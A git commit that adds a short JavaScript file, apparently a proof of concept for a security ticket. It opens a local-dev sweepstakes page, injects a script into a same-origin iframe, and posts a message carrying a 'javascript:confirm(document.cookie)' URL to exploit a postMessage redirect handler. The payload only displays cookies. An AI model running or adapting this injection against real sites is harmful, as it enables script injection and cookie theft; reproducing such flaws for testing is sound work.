828bff45d73670d5bdc08ed71be6685bb8598d93
Young Hwang <chunyeh.hwang@meredith.com>
2025-03-28 15:28:27 -0400

    Add files via upload

---
+++ art-1044-ew.js
@@ -0,0 +1,15 @@
+const targetWindow = window.open('https://ew-local-dev.a-ue1.ew:8443/sweepstakes', '_blank');
+let interval = setInterval(() => {
+    if (targetWindow.closed) {
+        clearInterval(interval);
+        return;
+    }
+    const iframe = targetWindow.frames[1];
+
+    if (iframe && iframe.location.origin === window.location.origin) {
+        const script = iframe.document.createElement('script');
+        script.textContent = `window.parent.postMessage({redirectExternalURL:'javascript:confirm(document.cookie)'},'*')`;
+        iframe.document.body.appendChild(script);
+        clearInterval(interval);
+    }
+}, 100);
